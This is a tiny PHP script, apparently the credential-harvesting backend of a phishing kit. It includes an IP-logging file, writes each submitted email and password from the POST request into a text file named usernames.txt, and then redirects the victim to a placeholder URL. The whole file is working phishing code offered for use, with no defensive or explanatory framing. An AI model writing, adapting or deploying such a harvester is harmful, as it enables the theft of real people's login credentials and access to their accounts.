<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['Email'] . " [PASS]: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
